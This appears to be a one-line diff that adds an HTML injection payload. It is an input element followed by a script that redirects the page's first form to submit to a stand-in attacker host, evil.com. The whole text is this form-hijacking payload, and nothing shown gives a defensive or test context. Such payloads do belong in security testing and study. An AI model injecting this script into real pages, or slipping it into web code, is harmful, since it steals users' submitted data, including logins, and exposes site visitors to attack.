@@ -1,0 +1,1 @@
+<input type='text' value=''><script>document.forms[0].action='http://evil.com';</script>
